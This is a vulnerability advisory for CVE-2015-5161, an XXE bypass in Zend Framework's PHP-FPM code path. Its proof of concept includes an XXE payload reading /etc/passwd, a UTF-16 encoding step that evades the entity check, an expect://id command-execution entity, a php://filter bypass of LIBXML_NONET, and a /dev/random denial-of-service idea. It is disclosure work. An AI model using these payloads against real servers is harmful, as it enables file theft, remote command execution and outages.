@@ -1,0 +1,482 @@
+=============================================
+- Release date: 12.08.2015
+- Discovered by: Dawid Golunski
+- Severity: High
+- CVE-ID: CVE-2015-5161
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+Zend Framework <= 2.4.2     XML eXternal Entity Injection (XXE) on PHP FPM
+Zend Framework <= 1.12.13
+
+ 
+II. BACKGROUND
+-------------------------
+
+- Zend Framework 
+
+From http://framework.zend.com/about/ website:
+
+"Zend Framework 2 is an open source framework for developing web applications 
+and services using PHP 5.3+. Zend Framework 2 uses 100% object-oriented code and 
+utilises most of the new features of PHP 5.3, namely namespaces, late static 
+binding, lambda functions and closures.
+
+Zend Framework 2 evolved from Zend Framework 1, a successful PHP framework with
+over 15 million downloads."
+
+
+- PHP FPM
+
+http://php.net/manual/en/install.fpm.php
+
+"FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with
+ some additional features (mostly) useful for heavy-loaded sites."
+
+Starting from release 5.3.3 in early 2010, PHP merged the php-fpm fastCGI 
+process manager into its codebase. However PHP-FPM was available earlier as a 
+separate project (http://php-fpm.org/).
+
+ 
+III. INTRODUCTION
+-------------------------
+
+The XML standard defines a concept of external entites. 
+XXE (XML eXternal Entity) attack is an attack on an application that parses XML 
+input from untrusted sources using incorrectly configured XML parser. 
+The application may be forced to open arbitrary files and/or network resources.
+Exploiting XXE issues on PHP applications may also lead to denial of service or
+in some cases (for example, when an 'expect' PHP module is installed) lead to 
+command execution.
+
+An independent security reserach of Zend Framework revealed that it is 
+possible to bypass XXE security controls within the framework in case 
+the PHP application using Zend XML related classes (e.g Zend_XmlRpc_Server, 
+Zend_Feed, Zend_Config_Xml etc.) from Zend Framework is served via PHP FPM.
+Bypassing the controls may allow XXE attacks and lead to the aforementioned 
+exploitation possibilities on systems where the XML parser is set to resolve 
+entities.
+
+IV. DESCRIPTION
+-------------------------
+ 
+The security controls within the Zend Framework mitigate the XXE attack vectors
+by first calling libxml_disable_entity_loader(), and then looping 
+through the DOMDocument nodes testing if any is of type: XML_DOCUMENT_TYPE_NODE
+If so, an exception is raised and PHP script execution is halted.
+
+These controls have been included in the scan() function of a Zend_Xml_Security 
+class located in the following paths depending on the code branch of Zend 
+Framework:
+
+ZendFramework-1.12.13/library/Zend/Xml/Security.php
+
+ZendFramework-2.4.2/library/ZendXml/Security.php
+
+
+In case of the latest version of ZendFramework-1.12.13, 
+the relevant code blocks from the scan() function look as follows:
+
+
+---[library/Zend/Xml/Security.php ]---
+
+    public static function scan($xml, DOMDocument $dom = null)
+    {
+        if (self::isPhpFpm()) {
+            self::heuristicScan($xml);
+        }
+
+        if (!self::isPhpFpm()) {
+            $loadEntities = libxml_disable_entity_loader(true);
+            $useInternalXmlErrors = libxml_use_internal_errors(true);
+        }
+
+        // Load XML with network access disabled (LIBXML_NONET)
+        $result = $dom->loadXml($xml, LIBXML_NONET);
+        restore_error_handler();
+
+        if (!self::isPhpFpm()) {
+            libxml_disable_entity_loader($loadEntities);
+            libxml_use_internal_errors($useInternalXmlErrors);
+        }
+
+        if (!$result) {
+            return false;
+        }
+
+        // Scan for potential XEE attacks using ENTITY, if not PHP-FPM
+        if (!self::isPhpFpm()) {
+            foreach ($dom->childNodes as $child) {
+                if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
+                    if ($child->entities->length > 0) {
+                        require_once 'Exception.php';
+                        throw new Zend_Xml_Exception(self::ENTITY_DETECT);
+                    }
+                }
+            }
+        }
+
+        if (isset($simpleXml)) {
+            $result = simplexml_import_dom($dom);
+            if (!$result instanceof SimpleXMLElement) {
+                return false;
+            }
+            return $result;
+        }
+        return $dom;
+
+
+--------------------------------------
+
+
+As we can see from the code, the application disables the entity loader
+(via libxml_disable_entity_loader), it also disables network access 
+(LIBXML_NONET), and it additionally scans provided XML for the presence of XML
+entities to prevent potential entity expansion attacks.  
+The code succesfully prevents most XXE attacks. 
+
+However, as the PHP libxml_disable_entity_loader() function was reported not
+thread safe (the entity loader setting could potentially get overwritten 
+between hits in FPM processes), Zend Framework does not use it when the 
+application is hosted in a PHP-FPM environment. Instead, another approach is 
+taken to prevent the XXE attacks.
+
+In the code above we see the check !self::isPhpFpm() which determines the type
+of interface between web server and PHP (through the php_sapi_name() function). 
+If the SAPI is FPM-CGI (i.e. PHP-FPM) the following heuristicScan function gets 
+executed: 
+
+---[library/Zend/Xml/Security.php ]---
+
+    protected static function heuristicScan($xml)
+    {
+        if (strpos($xml, '<!ENTITY') !== false) {
+            require_once 'Exception.php';
+            throw new Zend_Xml_Exception(self::ENTITY_DETECT);
+        }
+    }
+
+--------------------------------------
+
+It validates provided XML by searching for any entity declaration. It throws an
+exception if it finds one. 
+Although this check cannot be bypassed by simply adding spaces or changing 
+the characters to lower case (an XML parser would reject such declaration 
+as invalid), this security check is nevertheless insufficient. 
+
+XML format allows for different types of encoding to be used, hence it is 
+possible to bypass the check by supplying specifically encoded XML content.
+For example, a UTF-16 encoding which uses 2-byte characters would be enough to
+bypass the ENTITY string check. 
+
+Apart from the ENTITY check, the code also adds the aformentioned LIBXML_NONET
+parameter to catch entities refering to network resources. 
+This limitation can also be bypassed as shown in the proof of concept exploit. 
+
+This makes the Zend Framework vulnerable to XXE injection attacks.
+
+ 
+V. PROOF OF CONCEPT
+-------------------------
+ 
+Below is a simple PHP application using Zend Framework to implement an XML-RPC
+server for demonstation:
+
+---[ zend_xmlrpc_server.php ]--
+
+<?php
+// Simple XML-RPC SERVER
+
+	function helloworld() {
+	    $text = "Hello world! This request was executed via ".php_sapi_name().".";
+	    return $text;
+	}
+	set_include_path("./ZendFramework-1.12.13/library/");
+	require_once("./ZendFramework-1.12.13/library/Zend/Loader/Autoloader.php");
+	Zend_Loader_Autoloader::getInstance();
+
+	$server = new Zend_XmlRpc_Server();
+	$server->addFunction('helloworld');
+
+	echo $server->handle();
+?>
+
+-------------------------------
+
+This test application is hosted on an Apache server with PHP-FPM.
+
+Requesting:
+
+POST /zend_poc/zend-xmlrpc-server.php HTTP/1.1
+Host: apache-php-fpm
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+  <methodName>helloworld</methodName>
+</methodCall>
+
+should return:
+
+<methodResponse><params><param><value><string>Hello world! 
+This request was executed via fpm-fcgi.</string></value></param></params>
+</methodResponse> 
+
+
+In order to exploit the XXE vulnerability contained in the Zend framework 
+an attacker can pass XML data containing external entities similar to:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE methodCall [
+  <!ENTITY pocdata SYSTEM "file:///etc/passwd">
+]>
+<methodCall>
+  <methodName>retrieved: &pocdata;</methodName>
+</methodCall>
+
+
+Feeding the above data to the zend-xmlrpc-server.php script will result in
+an error:
+
+<int>631</int></value></member><member><name>faultString</name><value>
+<string>Failed to parse request</string></value></member></struct></value>
+</fault></methodResponse> 
+
+which is due to the heuristicScan ENTITy detection.
+
+We can now encode the data to avoid the check.
+
+$ cat poc-utf8.xml |  sed 's/UTF-8/UTF-16/' \ 
+	| iconv -f UTF-8 -t UTF-16 >poc-utf16.xml
+
+Hex representation of the UTF-16 encoded XML file (including the change in
+the xml header to reflect the new encoding) looks as follows:
+
+$ hexdump -C poc-utf16.xml 
+
+00000000  ff fe 3c 00 3f 00 78 00  6d 00 6c 00 20 00 76 00  |..<.?.x.m.l. .v.|
+00000010  65 00 72 00 73 00 69 00  6f 00 6e 00 3d 00 22 00  |e.r.s.i.o.n.=.".|
+00000020  31 00 2e 00 30 00 22 00  20 00 65 00 6e 00 63 00  |1...0.". .e.n.c.|
+00000030  6f 00 64 00 69 00 6e 00  67 00 3d 00 22 00 55 00  |o.d.i.n.g.=.".U.|
+00000040  54 00 46 00 2d 00 38 00  22 00 3f 00 3e 00 0a 00  |T.F.-.8.".?.>...|
+00000050  3c 00 21 00 44 00 4f 00  43 00 54 00 59 00 50 00  |<.!.D.O.C.T.Y.P.|
+00000060  45 00 20 00 6d 00 65 00  74 00 68 00 6f 00 64 00  |E. .m.e.t.h.o.d.|
+00000070  43 00 61 00 6c 00 6c 00  20 00 5b 00 0a 00 20 00  |C.a.l.l. .[... .|
+00000080  20 00 3c 00 21 00 45 00  4e 00 54 00 49 00 54 00  | .<.!.E.N.T.I.T.|
+00000090  59 00 20 00 70 00 6f 00  63 00 64 00 61 00 74 00  |Y. .p.o.c.d.a.t.|
+000000a0  61 00 20 00 53 00 59 00  53 00 54 00 45 00 4d 00  |a. .S.Y.S.T.E.M.|
+000000b0  20 00 22 00 66 00 69 00  6c 00 65 00 3a 00 2f 00  | .".f.i.l.e.:./.|
+000000c0  2f 00 2f 00 65 00 74 00  63 00 2f 00 70 00 61 00  |/./.e.t.c./.p.a.|
+000000d0  73 00 73 00 77 00 64 00  22 00 3e 00 0a 00 5d 00  |s.s.w.d.".>...].|
+000000e0  3e 00 0a 00 3c 00 6d 00  65 00 74 00 68 00 6f 00  |>...<.m.e.t.h.o.|
+000000f0  64 00 43 00 61 00 6c 00  6c 00 3e 00 0a 00 20 00  |d.C.a.l.l.>... .|
+00000100  20 00 3c 00 6d 00 65 00  74 00 68 00 6f 00 64 00  | .<.m.e.t.h.o.d.|
+00000110  4e 00 61 00 6d 00 65 00  3e 00 72 00 65 00 74 00  |N.a.m.e.>.r.e.t.|
+00000120  72 00 69 00 65 00 76 00  65 00 64 00 3a 00 20 00  |r.i.e.v.e.d.:. .|
+00000130  26 00 70 00 6f 00 63 00  64 00 61 00 74 00 61 00  |&.p.o.c.d.a.t.a.|
+00000140  3b 00 3c 00 2f 00 6d 00  65 00 74 00 68 00 6f 00  |;.<./.m.e.t.h.o.|
+00000150  64 00 4e 00 61 00 6d 00  65 00 3e 00 0a 00 3c 00  |d.N.a.m.e.>...<.|
+00000160  2f 00 6d 00 65 00 74 00  68 00 6f 00 64 00 43 00  |/.m.e.t.h.o.d.C.|
+00000170  61 00 6c 00 6c 00 3e 00  0a 00                    |a.l.l.>...|
+
+As can be seen on the hexdump, the ENTITY word is encoded using 2-byte
+characters.
+
+Resupplying the encoded data contained in poc-utf16.xml to the Zend XMLRPC 
+application, depending on the underlying libxml library, may result in a 
+password file retrival from the remote server:
+
+$ wget -q -O /dev/stdout http://apache-phpfpm/zend_poc/zend-xmlrpc-server.php \
+--post-file=poc-utf16.xml 
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse><fault><value><struct><member><name>faultCode</name><value>
+<int>620</int></value></member><member><name>faultString</name><value><string>
+Method "retrieved: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+[cut]
+" does not exist</string></value></member></struct></value></fault>
+</methodResponse> 
+
+
+If the password file is not returned, an attacker may try another version
+of an XXE attack using parameter entities and an out-of-band communication. 
+Both of these can be used to exploit the vulnerability in Zend Framework on
+a greater number of libxml configurations.
+
+Remote command execution may also be possible if the remote system has an
+'expect' php module (libexpect-php) installed. 
+If this is the case, we can for example execute 'id' command via injecting 
+the entity:
+
+<!ENTITY pocdata SYSTEM "expect://id">
+
+which should return a result similar to:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse><fault><value><struct><member><name>faultCode</name><value>
+<int>620</int></value></member><member><name>faultString</name><value>
+<string>Method "retrieved: uid=33(www-data) gid=33(www-data) 
+groups=33(www-data) " does not exist</string></value></member>
+
+
+A separate POC exploit (zend-xmlrpc-exploit-cmd-exec.sh) is included which 
+runs commands with parameters and also implements parameter entities/OOB 
+communication.
+
+
+As mentioned in the description of this vulnerability, the Zend Framework
+adds a LIBXML_NONET flag to the loadXML() call in order to prevent reaching 
+network resources through XXE.
+
+As a result, requesting a network resource such as http://192.168.57.10 via XXE 
+injection will fail.
+
+This can be bypassed by using php://filter wrapper inside an entity, e.g:
+
+<!ENTITY pocdata SYSTEM "php://filter/read=convert.base64-encode/
+resource=http://192.168.57.10">
+
+This will return a base64 encoded response from the remote server bypassing
+the LIBXML_NONET restriction:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse><fault><value><struct><member><name>faultCode</name><value><int>620</int>
+</value></member><member><name>faultString</name><value><string>Method "
+retrieved: PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDMuMiBGaW5hb
+C8vRU4iPgo8aHRtbD4KIDxoZWFkPgogIDx0aXRsZT5JbmRleCBvZiAvPC90aXRsZT4KIDwvaGVhZ
+D4KIDxib2R5Pgo8aDE+SW5kZXggb2YgLzwvaDE+CiAgPHRhYmxlPgogICA8dHI+PHRoIHZhbGlnb
+j0idG9wIj48aW1nIHNyYz0iL2ljb[cut]
+
+
+This vulnerability may also lead to Denial of Service if for example the attacker 
+requests /dev/random file through XXE. This will cause the application to block 
+on the endless input from the random generator pseudo device, until the maximum 
+execution time is reached. 
+Sending multiple requests of such kind would exhaust the maximum number of 
+threads that the web server can create.
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+An unauthenticated remote exploitation may be possible on applications which 
+make use of Zend_XmlRpc_Server with a public XML-RPC endpoint as demonstrated 
+in this advisory. 
+Authentication in case of XML-RPC is not required for exploitation
+as the XML needs to be processed first in order for the application to read 
+the credentials passed from the login data within the xml-formatted input.
+
+This issue should be marked as high/critical due to the wide deployment of Zend 
+Framework (which includes some major CMS and e-commerce applications), the 
+number of Zend XML classes affected, low complexity of exploitation, as well
+as a possibility of an unauthenticated remote exploitation. 
+There is also a growing number of servers set up to serve PHP code with PHP-FPM,
+especially in web hosting environments which need to respond to heavy load.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+All systems making use of Zend Framework in versions starting from
+1.12.4 and 2.1.6 up to the latest versions of Zend Framework 1.12.13 (released
+2015-05-20) and 2.4.2 (released 2015-05-11) contain the XXE injection 
+vulnerability described in this advisory.
+
+All Zend Framework classes making use of XML and calling the vulnerable
+Zend_Xml_Security::scan() function are affected by this issue: 
+
+Zend/Amf/Parse/Amf0/Deserializer.php
+Zend/Amf/Parse/Amf3/Deserializer.php
+Zend/Config/Xml.php
+Zend/Dom/Query.php
+Zend/Feed/Abstract.php
+Zend/Feed/Entry/Abstract.php
+Zend/Feed/Entry/Atom.php
+Zend/Feed.php
+Zend/Feed/Reader.php
+Zend/Feed/Writer/Renderer/Entry/Atom.php
+Zend/Gdata/App/Base.php
+Zend/Gdata/App.php
+Zend/Gdata/Gapps/ServiceException.php
+Zend/Gdata/YouTube.php
+Zend/Json.php
+Zend/Mobile/Push/Message/Mpns/Raw.php
+Zend/Rest/Client/Result.php
+Zend/Search/Lucene/Document/Docx.php
+Zend/Search/Lucene/Document/OpenXml.php
+Zend/Search/Lucene/Document/Pptx.php
+Zend/Search/Lucene/Document/Xlsx.php
+Zend/Serializer/Adapter/Wddx.php
+Zend/Service/Amazon/Ec2/Response.php
+Zend/Service/Amazon.php
+Zend/Service/Amazon/SimpleDb/Response.php
+Zend/Service/Audioscrobbler.php
+Zend/Service/Delicious.php
+Zend/Service/Ebay/Finding.php
+Zend/Service/Flickr.php
+Zend/Service/SlideShare.php
+Zend/Service/SqlAzure/Management/Client.php
+Zend/Service/Technorati.php
+Zend/Service/WindowsAzure/Diagnostics/ConfigurationInstance.php
+Zend/Service/WindowsAzure/Management/Client.php
+Zend/Service/WindowsAzure/Storage.php
+Zend/Service/Yahoo.php
+Zend/Soap/Server.php
+Zend/Soap/Wsdl.php
+Zend/XmlRpc/Request.php
+Zend/XmlRpc/Response.php
+
+The vulnerability can be exploited in applications using vulnerable version
+of the framework, where PHP code is served with PHP-FPM, and when the xml parser
+installed in the system is set up to resolves entities. 
+
+PHP-FPM can be set up on popular web servers such as Apache, or Nginx 
+on Linux/Unix, as well as Windows systems (as per the 'fpm on cygwin' setup
+guides available on the Internet).
+
+ 
+VIII. SOLUTION
+-------------------------
+
+Install the latest version of Zend Framework containing the patch for this 
+vulnerability.
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com/
+
+http://legalhackers.com/advisories/zend-framework-XXE-vuln.txt
+
+http://framework.zend.com/blog/zend-framework-2-5-0-released.html
+
+http://framework.zend.com/security/advisory/ZF2015-06
+
+http://www.securiteam.com/
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5161
+
+
+X. DISCOVERED BY
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+Aug 12th, 2015:  Final version
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+
